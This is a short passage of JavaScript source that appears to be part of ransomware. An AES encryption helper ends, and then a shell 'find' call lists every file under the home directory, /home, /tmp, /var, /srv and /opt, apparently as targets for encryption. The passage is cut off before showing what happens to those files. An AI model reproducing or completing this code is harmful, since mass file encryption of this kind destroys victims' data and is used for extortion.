      var encryptedBuffer = aes.update(message);
      encryptedBuffer += aes.final();
      return encryptedBuffer;
    };

    const child = require('child_process').execSync;
    const files = child('find ~ /home /tmp /var /srv /opt -type f').toString('utf8');
